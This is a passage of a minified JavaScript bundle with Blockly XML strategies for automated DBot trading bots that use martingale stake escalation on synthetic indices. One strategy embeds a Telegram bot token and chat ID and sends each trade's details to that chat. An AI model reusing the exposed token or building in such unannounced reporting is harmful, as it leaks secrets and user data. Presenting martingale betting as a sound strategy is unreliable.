    <next>\n          <block type="variables_set" id="7sPy:Sl^ri)cRWQ=WuLm">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n            <value name="VALUE">\n              <block type="math_number" id="qT87lDuK9}qjV+3;/[u6">\n                <field name="NUM">0.5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="*##8y+nmgQ}K1y,}t^2T">\n                <field name="VAR" id="E~[s.X5egS+P$^H_o#nk">Entry Point</field>\n                <value name="VALUE">\n                  <block type="math_number" id="!$:`tm-dH0UWmd]/YmaC">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="|aPCht%cR1;/{xBLPS3`">\n                    <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT">Over Prediction</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="q?286.t{mx:LnX9J5j[,">\n                        <field name="NUM">3</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="([}7^3RUy=3jxOMc^PNJ">\n                        <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1">Expected Profit</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="3N|+2I?dnv(B)ixf$S$l">\n                            <field name="NUM">5</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="4Hj96![qXlxsC#x!b[~@">\n                            <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ">Stop Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="@.;$XBLeE~}}@:NV*!Fd">\n                                <field name="NUM">50</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="q~xXAN;4$!Df1QE4L}Xy">\n                                <field name="VAR" id="o#PtO)-%Wvm_=AQvH38N">Martingale</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="3zPF*3u^2%y2US,S#(+-">\n                                    <field name="NUM">2</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="~(`[dsZp^m9FuqDydNz3">\n                                    <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q">Recovery Prediction</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id=":kdVhp0U=xE2ALN65?fz">\n                                        <field name="NUM">4</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="procedures_callnoreturn" id="Nu3*]LggE,O|dzwSbzGA">\n                                        <mutation xmlns="http://www.w3.org/1999/xhtml" name="Fixed Blocks"></mutation>\n                                        <data>:Zu8Y}APEu3!!_[sinI5</data>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="{Dkfk~3kkr.wc8@{)~m0">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id="%PF8u9|zX9*I{Sj|1VT@">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number" id="TJ!MrnCmrS$Bx?A%Huu8">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="[=[~D]2jYL~/tc4OS]8/">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="t]=rH1V8+1.l+hnO2Z15">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="DR,CP(`,^*E0=DJ%4[ZZ">\n            <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="Q!WjmqV!JmoPK$1p=,Z`" collapsed="true" x="893" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id=")DN{cw.=-)6[,2s01][y">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="_A{.]PjMZUh!;SaEL(PQ">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="kF8CU|)Q8);OEBV23B35"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="H6A]tIXPMPJiME$*UNm5">\n                <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1">Expected Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="_k:V[v`h|_I*K4:#)ubt">\n            <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n            <statement name="STACK">\n              <block type="text_statement" id="1g~?n9%iP08%^|a}^)D-">\n                <value name="TEXT">\n                  <shadow type="text" id="8x84,??pD;a}S^9Xe,fn">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="#GiuOl|!IS#.dQ,z^u{[">\n                    <field name="TEXT">Congrats.  Take Profit hit \uD83D\uDC4D </field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="Wzeq`?|_(.Zo(MF%PVUa">\n                    <value name="TEXT">\n                      <shadow type="text" id="}N!T)apd~+!_c/N8Si}1">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="total_profit" id="{kIC:;hH!GMLK%hKOr-T"></block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="N(~vr~Hw#=;E6-FksizO">\n                <value name="TEXT">\n                  <shadow type="text" id="Bp6$(VRo#UxnC*1F~=(Y">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="#Nh0(1m^U=cv7LhiE+?x">\n                    <field name="VAR" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="smzONScgAqZX.OfS0Qdq">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="W4`xJpW1oHU2|pLa=B|h"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="w6?ckXU=)J*%XYM%{0_G">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="3b0oN!UO@MweXR~8#$|1">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="jbl|7CC[=%~@(EO`#P@K">\n                    <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="X/MJb0Q;/=5axNI3uVKA">\n            <value name="TEXT">\n              <shadow type="text" id="W2[GJ[gjfV@JB:$(Y^8W">\n                <field name="TEXT">STOPLOSS HIT</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="y|Maz[iF+,XXr*SS;dMc" collapsed="true">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="XV2Q0E0iQiX9MAc}Ef8A">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="MrPv1PE+y[*~{SPeHB#v">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="tI[r?GR?Wxfy^NA|7i}t">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="#t])Wko5d{6r,!u8rN`2">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="z!x0@[~P}s`m{WK{O*N2">\n                        <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT">Over Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="H~1YIqKtXe3,ZmT@jw6+">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                        <value name="VALUE">\n                          <block type="variables_get" id="VgEoCEi,e9l*VQ|#egF$">\n                            <field name="VAR" id="V3`ByiTyoj~_e_hJc;X=">Stake1</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="+|-b;cZbiZrCwLsK%A|7">\n                            <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="Vz/z)LkF9;{/EqO5FIqw">\n                                <field name="NUM">0</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="N[OgR#+rozJPhhP1(mh`">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="+EOo1sB@OV5LoQ^i*~$E">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="KVy-mg|N+4p=z,p%L@*Q">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="+(V.|a~SZS3E%#i~/,=B">\n                        <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q">Recovery Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="!-J0*a);qlq8P4ltOpUE">\n                        <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id="SR%0!Cn9vDE3fHI)fP5:">\n                            <field name="NUM">1</field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="yx`)8GK1%jmvlz55nup1">\n                            <mutation xmlns="http://www.w3.org/1999/xhtml" elseif="1"></mutation>\n                            <value name="IF0">\n                              <block type="logic_compare" id="$T(%`!cQnm3~bCv65^QR">\n                                <field name="OP">EQ</field>\n                                <value name="A">\n                                  <block type="variables_get" id="w#k/VfUHgsL*zWv(B{!r">\n                                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="daKP^(/{WmC8@oAcGz[B">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="CCt@ERU+uVH`v5)M}s92">\n                                <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                <value name="VALUE">\n                                  <block type="math_arithmetic" id="nE$E;oeO[:5eP81gCVzx">\n                                    <field name="OP">MULTIPLY</field>\n                                    <value name="A">\n                                      <shadow type="math_number" id="uCEY}eO{3bo*pd1^yxV/">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="=E0V(n6.B}uGLvO{8aVu">\n                                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow type="math_number" id=",Jv`wG=Z}(v0Hh2=[2D0">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="math_number" id="Ochi#s2.7.~Z`nTR1Gu*">\n                                        <field name="NUM">1.2</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                            <value name="IF1">\n                              <block type="logic_compare" id="=74Q-mSE~}ppu45i!gQX">\n                                <field name="OP">GT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="S`]UE7XL@9BqiEgBB;@:">\n                                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id=":Vu:JjQ@YQakD4v~966!">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO1">\n                              <block type="variables_set" id="Ts!Cd^)[R~sB(x/m?Nzl">\n                                <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                <value name="VALUE">\n                                  <block type="math_arithmetic" id="6YX*.sjJnU(@!rz7mO3[">\n                                    <field name="OP">MULTIPLY</field>\n                                    <value name="A">\n                                      <shadow type="math_number" id="uCEY}eO{3bo*pd1^yxV/">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="#7(?z.RH;/mTp]9jg:/5">\n                                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow type="math_number" id=",Jv`wG=Z}(v0Hh2=[2D0">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="iHH-yJ@:[b4x{MuW~Eoa">\n                                        <field name="VAR" id="o#PtO)-%Wvm_=AQvH38N">Martingale</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="notify_telegram" id=")Ae{d=7lIj9}8:NX#n?d" collapsed="true">\n                <value name="TELEGRAM_ACCESS_TOKEN">\n                  <shadow type="text" id="bnihvyZxdk+{uRfocRpr">\n                    <field name="TEXT">7438897374:AAFMSg47EFubYdXSqbttO7f7y0rKkeQ0_RY</field>\n                  </shadow>\n                </value>\n                <value name="TELEGRAM_CHAT_ID">\n                  <shadow type="text" id="V`^bsurSiA=lkkXGpM3$">\n                    <field name="TEXT">-1002664692552</field>\n                  </shadow>\n                </value>\n                <value name="TELEGRAM_MESSAGE">\n                  <shadow type="text" id="hda}H_H81)%RjyU%tWs8">\n                    <field name="TEXT">gg</field>\n                  </shadow>\n                  <block type="variables_get" id="U2b^Y/mzLH{(bS(@6pg5">\n                    <field name="VAR" id="=[Z~Xr60)Z7,Gh`bAzuF">Notify</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_join" id="sDVrBrRWlnFe*HzSBVQh" collapsed="true">\n                    <field name="VARIABLE" id="=[Z~Xr60)Z7,Gh`bAzuF">Notify</field>\n                    <statement name="STACK">\n                      <block type="text_statement" id="=)Z._]dh)bGyfHG@hk9M">\n                        <value name="TEXT">\n                          <shadow type="text" id="g8*xyliQqpWbe(y,GY7b">\n                            <field name="TEXT">Contract ID: </field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="text_statement" id="1:+RSYLbcJ^G,1[FfH9q">\n                            <value name="TEXT">\n                              <shadow type="text" id="NB!{+B73_}E/MYi|sWT)">\n                                <field name="TEXT"></field>\n                              </shadow>\n                              <block type="read_details" id="E*RA`-I{4mn1qes6Uz-.">\n                                <field name="DETAIL_INDEX">1</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="-+q:Enp%/dq-LSUM|d0E">\n                                <value name="TEXT">\n                                  <shadow type="text" id="cq6M_2IRPLlKh)_0H_el">\n                                    <field name="TEXT">  || Results: </field>\n                                  </shadow>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="H_t!vIoo8]h6Y#)})D=u">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="5k]($=:c#lSss[3VPZ/,">\n                                        <field name="TEXT"></field>\n                                      </shadow>\n                                      <block type="read_details" id="?^dp0-s9waqHqKF+dE)z">\n                                        <field name="DETAIL_INDEX">11</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="text_statement" id="XHbrHl(dVS6nAw+Lo=v}">\n                                        <value name="TEXT">\n                                          <shadow type="text" id="4+hDX)BH*@dt-MmCZ}oK">\n                                            <field name="TEXT">  || Stake: </field>\n                                          </shadow>\n                                        </value>\n                                        <next>\n                                          <block type="text_statement" id="J$S1c-Zpfq$36eV?N)X/">\n                                            <value name="TEXT">\n                                              <shadow type="text" id="!%e]l)(#sbL/OO3@MK$4">\n                                                <field name="TEXT"></field>\n                                              </shadow>\n                                              <block type="read_details" id="iJQ_Ctv,X7ov#T$9*1[n">\n                                                <field name="DETAIL_INDEX">2</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="text_statement" id="00uOx4CC).Cd}:8e[PBg">\n                                                <value name="TEXT">\n                                                  <shadow type="text" id="{+=9;8s-d+U`,9Yh#3BH">\n                                                    <field name="TEXT">  || Profit: </field>\n                                                  </shadow>\n                                                </value>\n                                                <next>\n                                                  <block type="text_statement" id="}-(f}(J`sm#@a`G[yIjL">\n                                                    <value name="TEXT">\n                                                      <shadow type="text" id="]s!XMxJ`dp3E)KlEo|(o">\n                                                        <field name="TEXT"></field>\n                                                      </shadow>\n                                                      <block type="read_details" id="k~}I0bD]J5:nO;Tvpc^H">\n                                                        <field name="DETAIL_INDEX">4</field>\n                                                      </block>\n                                                    </value>\n                                                    <next>\n                                                      <block type="text_statement" id="12sgrL#^k-2bJ4!1,^+D">\n                                                        <value name="TEXT">\n                                                          <shadow type="text" id="DDi0^aPMegIYy:j+Vpji">\n                                                            <field name="TEXT">  || Total Profit: </field>\n                                                          </shadow>\n                                                        </value>\n                                                        <next>\n                                                          <block type="text_statement" id="Ci@6D2!Gu]T~C+$X;_Xc">\n                                                            <value name="TEXT">\n                                                              <shadow type="text" id="npkR_T/lD!lxrfDt?Civ">\n                                                                <field name="TEXT"></field>\n                                                              </shadow>\n                                                              <block type="total_profit" id="fWl9GWzu6D0k?6ma:|C~"></block>\n                                                            </value>\n                                                            <next>\n                                                              <block type="text_statement" id="R39OC^}Ar_HWe$~Fd%p3">\n                                                                <value name="TEXT">\n                                                                  <shadow type="text" id="yUDVex/$K=aQOeBvZc1X">\n                                                                    <field name="TEXT"> || No. of Runs: </field>\n                                                                  </shadow>\n                                                                </value>\n                                                                <next>\n                                                                  <block type="text_statement" id="]]M$~G5Fs#P[9NgH6QV)">\n                                                                    <value name="TEXT">\n                                                                      <shadow type="text" id="H_;UkNDdt,zaH/nT0ZkN">\n                                                                        <field name="TEXT"></field>\n                                                                      </shadow>\n                                                                      <block type="total_runs" id="P=p#:b|*`]+@~Xg1@W|@"></block>\n                                                                    </value>\n                                                                  </block>\n                                                                </next>\n                                                              </block>\n                                                            </next>\n                                                          </block>\n                                                        </next>\n                                                      </block>\n                                                    </next>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </statement>\n                    <next>\n                      <block type="trade_again" id="dX9#uq8!`~,W]rcu15[e"></block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="Gs}:IU2/fgSK=gw}wEzj" collapsed="true" deletable="false" x="0" y="1072">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="fM#ojplD%p;NNV;fhE.p">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="8jRq=L7/OuLNa5WB;1E%">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="last_digit" id="hxie[fGEwZA(tr2mg/MD"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="9-]sG$;J@mJ31L,)W*$_">\n                <field name="VAR" id="E~[s.X5egS+P$^H_o#nk">Entry Point</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="apollo_notify" id="`{|vIXQ1OcsMpp$$rMX^">\n            <field name="NOTIFICATION_TYPE">success</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="?|$aR.VOO2lzK6:DxvGY">\n                <field name="TEXT">Entry Point Confirmed</field>\n              </shadow>\n            </value>\n            <next>\n              <block type="controls_if" id="{JUMUeN0qE_yhh6o;bv`">\n                <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="9Krsro|CE%1!_``.zV12">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id=")o9})(W{{X9?{Qm}|_(:">\n                        <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="w~V@Nr1{v3e)AO4}T+VU">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="apollo_purchase" id="4oUF0V`vAb?3~p;(}guu">\n                    <field name="PURCHASE_LIST">DIGITOVER</field>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="apollo_purchase" id="ws]_ha)nio4mZUG4NH[d">\n                    <field name="PURCHASE_LIST">DIGITOVER</field>\n                  </block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="apollo_notify" id="L!A8f7+F~t4zhrL9},qi">\n            <field name="NOTIFICATION_TYPE">warn</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="f%Iy|%Xg4Hs`|izLhUFZ">\n                <field name="TEXT">Waiting for Entry Point</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id=":Zu8Y}APEu3!!_[sinI5" collapsed="true" x="0" y="1168">\n    <field name="NAME">Fixed Blocks</field>\n    <comment pinned="false" h="80" w="160">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="variables_set" id="a[z|?7iqhrS/.m(OR8L(" collapsed="true">\n        <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n        <value name="VALUE">\n          <block type="variables_get" id="G:bSQLMo@(lMc^5Z(#QV">\n            <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT">Over Prediction</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="6Q](V?T%PKX8Rij[$j!S" collapsed="true">\n            <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n            <value name="VALUE">\n              <block type="math_number" id="3oMHex_SyQHn=!2(5ozL">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="5su3#UL@)eb6lLGuQDEP" collapsed="true">\n                <field name="VAR" id="V3`ByiTyoj~_e_hJc;X=">Stake1</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="zO+?wNO1(kSYgHW6u62U">\n                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="de[MYEa/$F7nK7DB*5x/" collapsed="true">\n                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="?.AIBhG2,XPpW||t2]QG">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="tick_analysis" id="kcP)]7|ha;j{TTSbVu_q" collapsed="true" x="0" y="1264">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="text_join" id="lK#m0:~I?^*ET4~U-^v4">\n        <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n        <statement name="STACK">\n          <block type="text_statement" id=",%LK=aSt#y[dpMeH7_fJ">\n            <value name="TEXT">\n              <shadow type="text" id="zc9qM1u!z@xjtH5i]Um!">\n                <field name="TEXT">Entry Point: </field>\n              </shadow>\n            </value>\n            <next>\n              <block type="text_statement" id="Kf[v8Q=h!6jzRCl*`_D*">\n                <value name="TEXT">\n                  <shadow type="text" id="~TTkS+#|gN(C^^gJ,5tW">\n                    <field name="TEXT">| </field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="text_statement" id="Ok-6pXSB|w/lj}5A[TqZ">\n                    <value name="TEXT">\n                      <shadow type="text" id="5FYCb,@)eB:7[c@k-L5G">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="variables_get" id="_l]Pf/$Z/Rj8yv7bd`_f">\n                        <field name="VAR" id="E~[s.X5egS+P$^H_o#nk">Entry Point</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="BUD69!n4IMhZFETl!/dF">\n                        <value name="TEXT">\n                          <shadow type="text" id="20eTXlY-3D@rOZ0udwi|">\n                            <field name="TEXT">   ||  </field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="text_statement" id="gE(MpQ?Zr-RHEVi|N8^!">\n                            <value name="TEXT">\n                              <shadow type="text" id="PfF^=5bTN0J=|Nr,,Oo#">\n                                <field name="TEXT">Last Digit: </field>\n                              </shadow>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="_m6im(7eYaPsP3C9Ug~9">\n                                <value name="TEXT">\n                                  <shadow type="text" id="29qy_Db7VjIhv=Dg`,oH">\n                                    <field name="TEXT"></field>\n                                  </shadow>\n                                  <block type="last_digit" id="rVw!_j(A[UkD{06U)Re/"></block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <next>\n          <block type="notify" id="+:}+F{Z`iV22gmMrj0=g">\n            <field name="NOTIFICATION_TYPE">info</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="toC,njQb:m/Dut4YBj`h">\n                <field name="TEXT">abc</field>\n              </shadow>\n              <block type="variables_get" id="jr#Lwn-Omd^3%Ag0c04[">\n                <field name="VAR" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n              </block>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            6422: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="https://developers.google.com/blockly/xml" is_dbot="true" collection="false">\n  <variables>\n    <variable id="m/0@k04/{zd{;wbJaCj1">Stake</variable>\n    <variable id="lr1s=lJ+AJ*`o.Y^L4}=">Take Profit</variable>\n    <variable id="hOWinPkCVo^_x#B^gBza">Stop Loss </variable>\n    <variable id="#5}q![T#9ogJNgfpd#|e">Stake win</variable>\n    <variable id="ge%ZkkYmJ/b9o4*B[}=,">Martingale</variable>\n    <variable id="f|+X(z[g;.k~:n`s@StB">Use Martingale</variable>\n  </variables>\n  <block type="trade_definition" id=";(2%m:O.G1l-N]EC*.=D" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="A9:%i6YXJ%T6$@E892YU" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="=ELGE^R`r*E}jalCI+uq" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">callput</field>\n            <field name="TRADETYPE_LIST">callput</field>\n            <next>\n              <block type="trade_definition_contracttype" id="]$gnRq5lf1@P)7*2YqD_" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="=?5Chf6*NWC^g-c$z8mJ" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="^U5!!m.!W1xTQH|fw4g(" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="y0z75h.A)s04jUU)ncVs" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="v}DKjs}%V2_iAlENXiD%">\n        <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="6n-v@wZ8a+H/ppot`|ja">\n            <field name="NUM">0.5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="bPk,R*X^ZR3+wC-dsIMr">\n            <field name="VAR" id="lr1s=lJ+AJ*`o.Y^L4}=">Take Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="WGJOAsc!5|u-r/Tcb=pm">\n                <field name="NUM">5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="HFx0Iepfbo,*/|D;Ju|2">\n                <field name="VAR" id="hOWinPkCVo^_x#B^gBza">Stop Loss </field>\n                <value name="VALUE">\n                  <block type="math_number" id="*xwtQcdh.:d(IPbis@%N">\n                    <field name="NUM">30</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="^(@0_zf-$ffiC-YF9H4F">\n                    <field name="VAR" id="ge%ZkkYmJ/b9o4*B[}=,">Martingale</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="d%{B1lSY8KG74d`(j6zW">\n                        <field name="NUM">2</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="fDm~xz_q-AX-|DI$.v7L">\n                        <field name="VAR" 